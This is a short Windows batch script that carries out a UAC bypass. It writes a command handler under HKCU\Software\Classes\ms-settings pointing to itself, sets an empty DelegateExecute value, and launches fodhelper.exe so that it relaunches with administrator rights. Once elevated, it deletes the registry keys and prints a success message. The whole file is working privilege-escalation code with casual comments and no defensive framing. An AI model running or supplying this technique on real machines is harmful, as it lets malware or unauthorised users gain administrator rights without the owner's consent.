@echo off

::Firstly we want to chack if program is running as Administrator
net session >nul 2>&1
:if program is running with Admin privileges
if %errorLevel% == 0 (
    ::Resetting the Regs values to make everything back normal.
    ::PLEASE N0TE THAT IF YOU JUST WANT TO MAKE THIS THING UNAVAILABLE FOR A WHILE, JUST DELETE THE "DELEGATEEXECUTE" KEY.
    :Delete the Default key.
    reg delete HKCU\Software\Classes\ms-settings\shell\open\command /ve /f
    :Delete the "DelegateExecute" key.
    reg delete HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f
    goto Admin
) else (
    ::Creating all the Registry keys we're gonna need to make it work.
    :Creating the key which will tell windows what to execute.
    reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /ve /d "%CD%\PrivilegeEscalation.bat" /f
    :Creating the key to tell windows "Notice me Senpai (and execute these command lines I entered in Default key)"
    reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /v DelegateExecute /f
    goto NotAdmin
)

:Admin
::Here we know that the program is running as Administor.
echo [!] CONGRATULATIONS YOU'RE EXECUTING THIS AS ADMIN
pause
exit

:NotAdmin
::Wher all the magic happens : we know we're not admin so we know also that the break is now wide open
::So let's let launch this piece of code by itself with admin rights !
cls
fodhelper.exe
